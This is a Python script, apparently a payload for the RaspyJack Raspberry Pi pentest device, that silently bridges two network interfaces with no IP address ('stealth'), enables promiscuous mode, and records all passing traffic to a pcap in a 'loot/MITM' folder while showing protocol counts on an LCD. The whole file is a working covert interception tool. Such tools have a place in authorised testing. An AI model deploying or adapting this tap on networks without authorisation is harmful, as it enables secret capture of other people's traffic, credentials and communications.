#!/usr/bin/env python3
"""
RaspyJack Payload – Stealth Bridge MITM 
---------------------------------------------------------
- Auto-detects 2 active interfaces (carrier=1)
- Creates a transparent bridge (br0) with NO IP (stealth)
- Starts tcpdump on br0 (PCAP)
- Live protocol counters via tshark
- Shows status/IPs on LCD
- Exit on KEY3
"""

import os
import sys
import time
import subprocess
from datetime import datetime
import threading

# Ensure RaspyJack modules are importable
sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..")))

import RPi.GPIO as GPIO  # type: ignore
import LCD_1in44, LCD_Config  # type: ignore
from PIL import Image, ImageDraw, ImageFont  # type: ignore

KEY3_PIN = 16
WIDTH, HEIGHT = 128, 128
BRIDGE = "br0"
REFRESH_SEC = 1.0

# Live counters (tshark)
stats_lock = threading.Lock()
PROTO_LIST = [
    "DNS", "HTTP",
    "TLS", "ICMP",
    "ARP", "SMB",
    "FTP", "SSH",
    "DHCP", "NTP",
    "QUIC", "SMTP",
    "SNMP", "RDP",
]

proto_counts = {p: 0 for p in PROTO_LIST}


def _run(cmd):
    return subprocess.run(cmd, capture_output=True, text=True)


def _read(path):
    try:
        with open(path, "r") as f:
            return f.read().strip()
    except Exception:
        return ""


def _iface_has_carrier(name):
    carrier = _read(f"/sys/class/net/{name}/carrier")
    return carrier == "1"


def _iface_operstate(name):
    return _read(f"/sys/class/net/{name}/operstate")


def _iface_ip(name):
    res = _run(["ip", "-4", "addr", "show", "dev", name])
    if res.returncode != 0:
        return None
    for line in res.stdout.splitlines():
        line = line.strip()
        if line.startswith("inet "):
            return line.split()[1].split("/")[0]
    return None


def _list_active_ifaces():
    ifaces = []
    for name in os.listdir("/sys/class/net"):
        if name in ("lo", BRIDGE):
            continue
        if _iface_has_carrier(name):
            ifaces.append(name)
    return ifaces


def _sort_ifaces(ifaces):
    def score(n):
        if n.startswith("eth"):
            return 0
        if n.startswith("en"):
            return 1
        if n.startswith("usb"):
            return 2
        return 3
    return sorted(ifaces, key=lambda n: (score(n), n))


def lcd_init():
    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    return lcd


def draw_lines(lcd, lines, color="white", bg="black", line_height=14, y_start=5):
    img = Image.new("RGB", (WIDTH, HEIGHT), bg)
    d = ImageDraw.Draw(img)
    font = ImageFont.load_default()
    y = y_start
    for line in lines:
        if line:
            d.text((5, y), line[:18], font=font, fill=color)
            y += line_height
    lcd.LCD_ShowImage(img, 0, 0)


def draw_stats(lcd, if1, if2):
    with stats_lock:
        counts = {k: proto_counts[k] for k in PROTO_LIST}

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    font = ImageFont.load_default()

    # Header
    d.rectangle((0, 0, 127, 14), fill="#1a1a1a")
    d.text((4, 2), f"{if1} <-> {if2}", font=font, fill="white")
    # Right-align KEY3 hint to avoid clipping
    hint = "KEY3:Stop"
    if hasattr(d, "textbbox"):
        x0, y0, x1, y1 = d.textbbox((0, 0), hint, font=font)
        w = x1 - x0
    else:
        w, _ = d.textsize(hint, font=font)
    d.text((127 - w - 2, 2), hint, font=font, fill="white")

    # Grid area
    top = 16
    rows = 7
    row_h = 16
    col_w = 64
    # Subtle grid lines
    for r in range(rows + 1):
        y = top + r * row_h
        d.line((0, y, 127, y), fill="#222222")
    d.line((63, top, 63, top + rows * row_h), fill="#222222")

    # Fill cells
    for idx, proto in enumerate(PROTO_LIST):
        r = idx // 2
        c = idx % 2
        x = 4 + c * col_w
        y = top + r * row_h + 3
        val = counts.get(proto, 0)
        text = f"{proto}: {val}"
        d.text((x, y), text[:10], font=font, fill="white")

    lcd.LCD_ShowImage(img, 0, 0)


def wait_key3():
    while GPIO.input(KEY3_PIN) == 1:
        time.sleep(0.1)


def ensure_bridge_cleanup(if1, if2):
    _run(["ip", "link", "set", BRIDGE, "down"])
    _run(["ip", "link", "del", BRIDGE])
    _run(["ip", "link", "set", if1, "down"])
    _run(["ip", "link", "set", if2, "down"])
    _run(["ip", "link", "set", if1, "up"])
    _run(["ip", "link", "set", if2, "up"])


def setup_bridge(if1, if2):
    # bring down and flush
    _run(["ip", "link", "set", if1, "down"])
    _run(["ip", "link", "set", if2, "down"])
    _run(["ip", "addr", "flush", "dev", if1])
    _run(["ip", "addr", "flush", "dev", if2])

    # create bridge
    _run(["ip", "link", "add", BRIDGE, "type", "bridge"])
    _run(["ip", "link", "set", if1, "master", BRIDGE])
    _run(["ip", "link", "set", if2, "master", BRIDGE])

    # promiscuous + up
    _run(["ip", "link", "set", if1, "promisc", "on"])
    _run(["ip", "link", "set", if2, "promisc", "on"])
    _run(["ip", "link", "set", if1, "up"])
    _run(["ip", "link", "set", if2, "up"])
    _run(["ip", "link", "set", BRIDGE, "up"])

    # stealth: no IP on bridge
    _run(["ip", "addr", "flush", "dev", BRIDGE])


def start_sniffer():
    loot_dir = "/root/Raspyjack/loot/MITM"
    os.makedirs(loot_dir, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H%M%S")
    pcap_file = f"{loot_dir}/stealth_bridge_{ts}.pcap"
    proc = subprocess.Popen(["tcpdump", "-i", BRIDGE, "-w", pcap_file])
    return proc, pcap_file


def start_tshark_stats():
    # tshark line-based summary
    cmd = [
        "tshark",
        "-l",
        "-i", BRIDGE,
        "-T", "fields",
        "-E", "separator=,",
        "-e", "_ws.col.Protocol",
    ]
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)


def _map_proto(raw):
    p = raw.strip().upper()
    if "DNS" in p:
        return "DNS"
    if "HTTP" in p:
        return "HTTP"
    if "TLS" in p or "SSL" in p:
        return "TLS"
    if "ICMP" in p:
        return "ICMP"
    if "ARP" in p:
        return "ARP"
    if "SMB" in p or "NBSS" in p or "SMB2" in p:
        return "SMB"
    if "FTP" in p:
        return "FTP"
    if "SSH" in p:
        return "SSH"
    if "DHCP" in p or "BOOTP" in p:
        return "DHCP"
    if "NTP" in p:
        return "NTP"
    if "QUIC" in p:
        return "QUIC"
    if "SMTP" in p:
        return "SMTP"
    if "SNMP" in p:
        return "SNMP"
    if "RDP" in p:
        return "RDP"
    return None


def stats_loop(proc):
    if proc.stdout is None:
        return
    for line in proc.stdout:
        proto = _map_proto(line)
        if not proto:
            continue
        with stats_lock:
            proto_counts[proto] += 1


def main():
    lcd = lcd_init()
    GPIO.setmode(GPIO.BCM)
    GPIO.setup(KEY3_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    draw_lines(lcd, ["Stealth Bridge", "Detecting...", "", "Please wait"])
    ifaces = _sort_ifaces(_list_active_ifaces())
    if len(ifaces) < 2:
        draw_lines(lcd, ["Need 2 ifaces", "No bridge", "", "KEY3 to exit"], color="white", bg="black")
        wait_key3()
        return 1

    if1, if2 = ifaces[0], ifaces[1]
    ip1 = _iface_ip(if1) or "-"
    ip2 = _iface_ip(if2) or "-"

    draw_lines(lcd, [f"IF1: {if1}", f"IP: {ip1}", f"IF2: {if2}", f"IP: {ip2}"])
    time.sleep(1.5)

    draw_lines(lcd, ["Setting bridge", f"{if1} <-> {if2}", "", "Stealth mode"])
    setup_bridge(if1, if2)

    draw_lines(lcd, ["Starting sniff", "tcpdump on br0", "tshark stats", "KEY3 to stop"])
    sniffer, output = start_sniffer()
    tshark_proc = start_tshark_stats()
    stats_thread = threading.Thread(target=stats_loop, args=(tshark_proc,), daemon=True)
    stats_thread.start()

    try:
        while GPIO.input(KEY3_PIN) == 1:
            draw_stats(lcd, if1, if2)
            time.sleep(REFRESH_SEC)
    finally:
        draw_lines(lcd, ["Stopping...", "Cleaning up", "", ""])
        try:
            sniffer.terminate()
            sniffer.wait(timeout=3)
        except Exception:
            pass
        try:
            tshark_proc.terminate()
            tshark_proc.wait(timeout=3)
        except Exception:
            pass
        ensure_bridge_cleanup(if1, if2)
        LCD_1in44.LCD().LCD_Clear()
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
